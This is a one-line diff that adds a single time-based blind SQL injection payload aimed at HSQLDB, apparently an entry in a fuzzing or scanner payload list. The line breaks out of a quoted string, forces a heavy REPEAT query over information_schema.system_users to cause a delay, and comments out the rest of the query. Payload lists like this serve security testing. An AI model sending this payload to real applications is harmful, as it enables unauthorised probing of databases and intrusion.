@@ -1,0 +1,1 @@
+1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--
